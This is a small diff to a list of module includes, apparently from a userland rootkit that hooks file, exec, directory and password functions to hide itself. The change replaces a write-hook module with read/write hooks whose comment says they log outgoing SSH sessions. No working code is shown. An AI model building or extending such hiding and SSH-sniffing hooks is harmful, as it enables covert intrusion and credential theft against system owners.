@@ -15,7 +15,7 @@
 "hiding/hiding.h" # self explanatory hiding stuff
 "exec/exec.h" # exec (execution) hooks
 "open/open.h" # file open & access hooks
-"wrt/wrt.h" # misc write hooks
+"rw/rw.h" # read/write hooks. we logging outgoing ssh nao
 "dir/dir.h" # all directory related stuff
 "pwd/pwd.h" # pwd-struct related hooks (getpwnam, etc)
 "gid/gid.h" # setgid safety net
